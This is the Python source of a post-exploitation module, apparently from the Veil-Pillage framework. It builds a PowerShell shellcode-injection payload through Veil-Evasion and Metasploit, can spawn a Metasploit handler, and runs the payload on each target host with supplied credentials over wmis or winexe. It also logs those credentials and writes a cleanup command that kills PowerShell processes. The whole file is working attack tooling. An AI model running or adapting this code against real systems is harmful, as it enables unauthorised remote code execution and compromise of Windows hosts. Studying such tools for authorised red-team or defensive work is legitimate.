"""

Invokes a powershell payload on a host.

Module built by @harmj0y

"""

import sys, base64, re, time, os


from lib import helpers
from lib import messages
from lib import smb
from lib import command_methods
import settings

# Veil-Evasion import for shellcode generation
from modules.payloads.powershell.shellcode_inject import virtual

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Powershell Injector"
        self.description = "Injects shellcode on a target using powershell."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # holder for the argument dictionary passed by the main pillage.py
        # so we can parse command line arguments as necessary
        self.args = args

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method"   : ["wmis", "[wmis] or [winexe] for triggering"],
                                 "spawn_handler"    : ["false", "spawn a meterpreter handler"],
                                 "shellcode"        : ["veil", "[veil] or custom shellcode"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
        spawnHandler = self.required_options["spawn_handler"][0]

        # create our powershell payload
        p = virtual.Payload()

        # pull out any msfpayload payloads/options
        if self.args.msfpayload:
            p.shellcode.SetPayload([self.args.msfpayload, self.args.msfoptions])

        # set custom shellcode if specified
        elif self.args.custshell:
            p.shellcode.setCustomShellcode(self.args.custshell)

        # get the powershell command
        powershellCommand = p.generate()

        # re-print the title and module name after shellcode generation (Veil-Evasion trashes this)
        messages.title()
        sys.stdout.write(" [*] Executing module: " + helpers.color(self.name) + "...")

        # if we're using Veil-Evasion's generated handler script, try to spawn it
        if spawnHandler.lower() == "true":
            # turn the payload shellcode object into a handler script
            handlerPath = helpers.shellcodeToHandler(p.shellcode)
            # make sure a handler was returned
            if handlerPath != "":
                # command to spawn a new tab
                cmd = "gnome-terminal --tab -t \"Veil-Pillage Handler\" -x bash -c \"echo ' [*] Spawning Metasploit handler...' && msfconsole -r '" + handlerPath + "'\""
                # invoke msfconsole with the handler script in a new tab
                os.system(cmd)
                raw_input("\n\n [>] Press enter when handler is ready: ")


        for target in self.targets:

            print helpers.color(" [*] Triggering powershell command on "+target)

            # execute the powershell command on each host
            command_methods.executeCommand(target, username, password, powershellCommand, triggerMethod)

            self.output += "[*] Powershell inject command triggered using creds '"+username+":"+password+"' on "+target+" with "+triggerMethod+"\n"

            # build our cleanup file -> kill all powershell processes
            killCMD = "taskkill /f /im powershell.exe"
            self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+killCMD+"|"+triggerMethod+"\n"
